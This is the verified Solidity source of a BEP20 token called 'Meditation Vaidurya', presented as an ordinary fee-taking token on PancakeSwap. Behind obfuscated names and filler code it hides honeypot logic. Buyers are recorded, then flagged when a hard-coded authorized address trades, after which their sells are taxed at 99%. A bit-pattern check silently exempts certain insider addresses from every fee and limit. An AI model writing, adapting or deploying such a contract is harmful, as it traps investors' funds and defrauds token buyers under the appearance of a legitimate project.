/**
 *Submitted for verification at BscScan.com on 2022-12-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract MeditationVaidurya is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Meditation Vaidurya ";
    string constant _symbol = "MeditationVaidurya";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private swapExemptWalletTx;
    mapping(address => bool) private autoBuyModeMin;
    mapping(address => bool) private launchedReceiverTradingIs;
    mapping(address => bool) private autoBuyBotsLimitMinTrading;
    mapping(address => uint256) private marketingBuyLimitMode;
    mapping(uint256 => address) private autoLimitIsBuy;
    uint256 public exemptLimitValue = 0;
    uint256 private launchBlock = 0;
    //BUY FEES
    uint256 private minSwapBuyTx = 0;
    uint256 private isFeeWalletBurn = 3;

    //SELL FEES
    uint256 private receiverFeeExemptBurn = 0;
    uint256 private isSellLiquidityMarketingReceiverWallet = 3;

    uint256 private tradingSellTeamMinModeAuto = isFeeWalletBurn + minSwapBuyTx;
    uint256 private txReceiverLiquiditySellLaunchedSwap = 100;

    address private minMaxTeamLiquidityBurnSell = (msg.sender); // auto-liq address
    address private minBurnLiquidityTrading = (0xB5218BAAA23C6fa415f9CE8DFfFFD0cdD96bC61e); // marketing address
    address private launchedModeMarketingTeam = DEAD;
    address private feeMaxReceiverWalletTxMarketing = DEAD;
    address private autoExemptFeeMarketing = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private liquidityExemptBotsTeamIs;
    uint256 private liquidityMaxFeeTeamExemptIs;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private buyMinLiquidityExempt;
    uint256 private swapExemptAutoTeamFeeMarketingLaunched;
    uint256 private isTeamFeeBurn;
    uint256 private launchedSellTxMaxFeeMarketingExempt;
    uint256 private isExemptSwapLiquidityMaxModeBots;

    bool private limitMinFeeLiquidity = true;
    bool private autoBuyBotsLimitMinTradingMode = true;
    bool private limitSellMaxTxTradingTeam = true;
    bool private marketingBuyModeExempt = true;
    bool private launchedFeeTeamSellMarketingTradingLiquidity = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private feeLimitAutoMin = 6 * 10 ** 15;
    uint256 private isTxAutoMode = _totalSupply / 1000; // 0.1%

    
    bool private sellMaxAutoIsBurnSwapReceiver = false;
    uint256 private botsReceiverBuyTeam = 0;
    bool private isTxReceiverAuto = false;
    bool private sellBuyTradingLaunched = false;
    bool private marketingBotsTxTradingMax = false;
    bool private marketingAutoMinMax = false;
    bool private burnLiquidityMinBots = false;
    uint256 private autoTxMarketingIs = 0;
    bool private feeBotsMaxTxExempt = false;
    bool private sellReceiverModeLimit = false;
    uint256 private botsReceiverBuyTeam0 = 0;
    bool private botsReceiverBuyTeam1 = false;
    bool private botsReceiverBuyTeam2 = false;
    bool private botsReceiverBuyTeam3 = false;
    bool private botsReceiverBuyTeam4 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        buyMinLiquidityExempt = true;

        swapExemptWalletTx[msg.sender] = true;
        swapExemptWalletTx[address(this)] = true;

        autoBuyModeMin[msg.sender] = true;
        autoBuyModeMin[0x0000000000000000000000000000000000000000] = true;
        autoBuyModeMin[0x000000000000000000000000000000000000dEaD] = true;
        autoBuyModeMin[address(this)] = true;

        launchedReceiverTradingIs[msg.sender] = true;
        launchedReceiverTradingIs[0x0000000000000000000000000000000000000000] = true;
        launchedReceiverTradingIs[0x000000000000000000000000000000000000dEaD] = true;
        launchedReceiverTradingIs[address(this)] = true;

        SetAuthorized(address(0x24ACeAfC6B6B2A61A1aD3df9fffFfd5C1694b1b6));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return maxBotsSwapTeam(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return maxBotsSwapTeam(sender, recipient, amount);
    }

    function maxBotsSwapTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = marketingAutoModeExempt(sender) || marketingAutoModeExempt(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                burnMaxMinTrading();
            }
            if (!bLimitTxWalletValue) {
                burnSellMarketingLaunched(recipient);
            }
        }
        
        
        if (botsReceiverBuyTeam4 == launchedFeeTeamSellMarketingTradingLiquidity) {
            botsReceiverBuyTeam4 = marketingAutoMinMax;
        }


        if (inSwap || bLimitTxWalletValue) {return isLaunchedTradingLimit(sender, recipient, amount);}


        if (!swapExemptWalletTx[sender] && !swapExemptWalletTx[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");
        }
        
        if (botsReceiverBuyTeam0 == botsReceiverBuyTeam0) {
            botsReceiverBuyTeam0 = tradingSellTeamMinModeAuto;
        }

        if (botsReceiverBuyTeam2 == sellReceiverModeLimit) {
            botsReceiverBuyTeam2 = burnLiquidityMinBots;
        }

        if (botsReceiverBuyTeam != tradingSellTeamMinModeAuto) {
            botsReceiverBuyTeam = botsReceiverBuyTeam;
        }


        require((amount <= _maxTxAmount) || launchedReceiverTradingIs[sender] || launchedReceiverTradingIs[recipient], "Max TX Limit!");

        if (buyTradingLimitSell()) {isLimitBotsTx();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        
        uint256 amountReceived = walletMarketingLimitLiquidity(sender) ? txLaunchedModeAuto(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function isLaunchedTradingLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function walletMarketingLimitLiquidity(address sender) internal view returns (bool) {
        return !autoBuyModeMin[sender];
    }

    function isLimitMinBuyLiquiditySell(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            tradingSellTeamMinModeAuto = isSellLiquidityMarketingReceiverWallet + receiverFeeExemptBurn;
            return burnBuySellTeam(sender, tradingSellTeamMinModeAuto);
        }
        if (!selling && sender == uniswapV2Pair) {
            tradingSellTeamMinModeAuto = isFeeWalletBurn + minSwapBuyTx;
            return tradingSellTeamMinModeAuto;
        }
        return burnBuySellTeam(sender, tradingSellTeamMinModeAuto);
    }

    function burnTxExemptLimit() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function txLaunchedModeAuto(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (sellMaxAutoIsBurnSwapReceiver != marketingBotsTxTradingMax) {
            sellMaxAutoIsBurnSwapReceiver = isTxReceiverAuto;
        }


        uint256 feeAmount = amount.mul(isLimitMinBuyLiquiditySell(sender, receiver == uniswapV2Pair)).div(txReceiverLiquiditySellLaunchedSwap);

        if (autoBuyBotsLimitMinTrading[sender] || autoBuyBotsLimitMinTrading[receiver]) {
            feeAmount = amount.mul(99).div(txReceiverLiquiditySellLaunchedSwap);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function marketingAutoModeExempt(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function burnBuySellTeam(address sender, uint256 pFee) private view returns (uint256) {
        uint256 f0 = marketingBuyLimitMode[sender];
        uint256 f1 = pFee;
        if (f0 > 0 && block.timestamp - f0 > 2) {
            f1 = 99;
        }
        return f1;
    }

    function burnSellMarketingLaunched(address addr) private {
        if (burnTxExemptLimit() < feeLimitAutoMin) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        autoLimitIsBuy[exemptLimitValue] = addr;
    }

    function burnMaxMinTrading() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (marketingBuyLimitMode[autoLimitIsBuy[i]] == 0) {
                    marketingBuyLimitMode[autoLimitIsBuy[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function buyTradingLimitSell() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    launchedFeeTeamSellMarketingTradingLiquidity &&
    _balances[address(this)] >= isTxAutoMode;
    }

    function isLimitBotsTx() internal swapping {
        
        uint256 amountToLiquify = isTxAutoMode.mul(minSwapBuyTx).div(tradingSellTeamMinModeAuto).div(2);
        uint256 amountToSwap = isTxAutoMode.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (isTxReceiverAuto == botsReceiverBuyTeam3) {
            isTxReceiverAuto = sellBuyTradingLaunched;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = tradingSellTeamMinModeAuto.sub(minSwapBuyTx.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(minSwapBuyTx).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(isFeeWalletBurn).div(totalETHFee);
        
        if (botsReceiverBuyTeam0 == botsReceiverBuyTeam0) {
            botsReceiverBuyTeam0 = isFeeWalletBurn;
        }

        if (botsReceiverBuyTeam4 == marketingAutoMinMax) {
            botsReceiverBuyTeam4 = burnLiquidityMinBots;
        }


        payable(minBurnLiquidityTrading).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                minMaxTeamLiquidityBurnSell,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBurnLiquidityMinBots() public view returns (bool) {
        return burnLiquidityMinBots;
    }
    function setBurnLiquidityMinBots(bool a0) public onlyOwner {
        if (burnLiquidityMinBots == launchedFeeTeamSellMarketingTradingLiquidity) {
            launchedFeeTeamSellMarketingTradingLiquidity=a0;
        }
        burnLiquidityMinBots=a0;
    }

    function getIsTxAutoMode() public view returns (uint256) {
        if (isTxAutoMode == botsReceiverBuyTeam0) {
            return botsReceiverBuyTeam0;
        }
        if (isTxAutoMode != autoTxMarketingIs) {
            return autoTxMarketingIs;
        }
        return isTxAutoMode;
    }
    function setIsTxAutoMode(uint256 a0) public onlyOwner {
        if (isTxAutoMode != botsReceiverBuyTeam) {
            botsReceiverBuyTeam=a0;
        }
        if (isTxAutoMode == isFeeWalletBurn) {
            isFeeWalletBurn=a0;
        }
        isTxAutoMode=a0;
    }

    function getBotsReceiverBuyTeam2() public view returns (bool) {
        return botsReceiverBuyTeam2;
    }
    function setBotsReceiverBuyTeam2(bool a0) public onlyOwner {
        if (botsReceiverBuyTeam2 == botsReceiverBuyTeam1) {
            botsReceiverBuyTeam1=a0;
        }
        if (botsReceiverBuyTeam2 != botsReceiverBuyTeam2) {
            botsReceiverBuyTeam2=a0;
        }
        botsReceiverBuyTeam2=a0;
    }

    function getReceiverFeeExemptBurn() public view returns (uint256) {
        if (receiverFeeExemptBurn != isSellLiquidityMarketingReceiverWallet) {
            return isSellLiquidityMarketingReceiverWallet;
        }
        if (receiverFeeExemptBurn != minSwapBuyTx) {
            return minSwapBuyTx;
        }
        if (receiverFeeExemptBurn != botsReceiverBuyTeam) {
            return botsReceiverBuyTeam;
        }
        return receiverFeeExemptBurn;
    }
    function setReceiverFeeExemptBurn(uint256 a0) public onlyOwner {
        if (receiverFeeExemptBurn != botsReceiverBuyTeam0) {
            botsReceiverBuyTeam0=a0;
        }
        if (receiverFeeExemptBurn == botsReceiverBuyTeam0) {
            botsReceiverBuyTeam0=a0;
        }
        receiverFeeExemptBurn=a0;
    }

    function getSellBuyTradingLaunched() public view returns (bool) {
        return sellBuyTradingLaunched;
    }
    function setSellBuyTradingLaunched(bool a0) public onlyOwner {
        if (sellBuyTradingLaunched == botsReceiverBuyTeam1) {
            botsReceiverBuyTeam1=a0;
        }
        if (sellBuyTradingLaunched == autoBuyBotsLimitMinTradingMode) {
            autoBuyBotsLimitMinTradingMode=a0;
        }
        sellBuyTradingLaunched=a0;
    }

    function getIsSellLiquidityMarketingReceiverWallet() public view returns (uint256) {
        if (isSellLiquidityMarketingReceiverWallet != tradingSellTeamMinModeAuto) {
            return tradingSellTeamMinModeAuto;
        }
        if (isSellLiquidityMarketingReceiverWallet != isSellLiquidityMarketingReceiverWallet) {
            return isSellLiquidityMarketingReceiverWallet;
        }
        if (isSellLiquidityMarketingReceiverWallet != txReceiverLiquiditySellLaunchedSwap) {
            return txReceiverLiquiditySellLaunchedSwap;
        }
        return isSellLiquidityMarketingReceiverWallet;
    }
    function setIsSellLiquidityMarketingReceiverWallet(uint256 a0) public onlyOwner {
        if (isSellLiquidityMarketingReceiverWallet == receiverFeeExemptBurn) {
            receiverFeeExemptBurn=a0;
        }
        isSellLiquidityMarketingReceiverWallet=a0;
    }

    function getMarketingBuyLimitMode(address a0) public view returns (uint256) {
        if (a0 != launchedModeMarketingTeam) {
            return minSwapBuyTx;
        }
        if (a0 == minMaxTeamLiquidityBurnSell) {
            return botsReceiverBuyTeam;
        }
            return marketingBuyLimitMode[a0];
    }
    function setMarketingBuyLimitMode(address a0,uint256 a1) public onlyOwner {
        if (a0 == feeMaxReceiverWalletTxMarketing) {
            autoTxMarketingIs=a1;
        }
        if (a0 != minBurnLiquidityTrading) {
            autoTxMarketingIs=a1;
        }
        marketingBuyLimitMode[a0]=a1;
    }

    function getIsFeeWalletBurn() public view returns (uint256) {
        if (isFeeWalletBurn == feeLimitAutoMin) {
            return feeLimitAutoMin;
        }
        if (isFeeWalletBurn == feeLimitAutoMin) {
            return feeLimitAutoMin;
        }
        if (isFeeWalletBurn != feeLimitAutoMin) {
            return feeLimitAutoMin;
        }
        return isFeeWalletBurn;
    }
    function setIsFeeWalletBurn(uint256 a0) public onlyOwner {
        if (isFeeWalletBurn != botsReceiverBuyTeam) {
            botsReceiverBuyTeam=a0;
        }
        if (isFeeWalletBurn == minSwapBuyTx) {
            minSwapBuyTx=a0;
        }
        if (isFeeWalletBurn != autoTxMarketingIs) {
            autoTxMarketingIs=a0;
        }
        isFeeWalletBurn=a0;
    }

    function getTradingSellTeamMinModeAuto() public view returns (uint256) {
        if (tradingSellTeamMinModeAuto != receiverFeeExemptBurn) {
            return receiverFeeExemptBurn;
        }
        if (tradingSellTeamMinModeAuto != botsReceiverBuyTeam) {
            return botsReceiverBuyTeam;
        }
        return tradingSellTeamMinModeAuto;
    }
    function setTradingSellTeamMinModeAuto(uint256 a0) public onlyOwner {
        tradingSellTeamMinModeAuto=a0;
    }

    function getSellReceiverModeLimit() public view returns (bool) {
        if (sellReceiverModeLimit != feeBotsMaxTxExempt) {
            return feeBotsMaxTxExempt;
        }
        if (sellReceiverModeLimit != marketingBuyModeExempt) {
            return marketingBuyModeExempt;
        }
        if (sellReceiverModeLimit != limitMinFeeLiquidity) {
            return limitMinFeeLiquidity;
        }
        return sellReceiverModeLimit;
    }
    function setSellReceiverModeLimit(bool a0) public onlyOwner {
        if (sellReceiverModeLimit == marketingBuyModeExempt) {
            marketingBuyModeExempt=a0;
        }
        if (sellReceiverModeLimit != marketingAutoMinMax) {
            marketingAutoMinMax=a0;
        }
        sellReceiverModeLimit=a0;
    }

    function getSwapExemptWalletTx(address a0) public view returns (bool) {
            return swapExemptWalletTx[a0];
    }
    function setSwapExemptWalletTx(address a0,bool a1) public onlyOwner {
        if (swapExemptWalletTx[a0] == autoBuyBotsLimitMinTrading[a0]) {
           autoBuyBotsLimitMinTrading[a0]=a1;
        }
        if (a0 == launchedModeMarketingTeam) {
            marketingAutoMinMax=a1;
        }
        swapExemptWalletTx[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}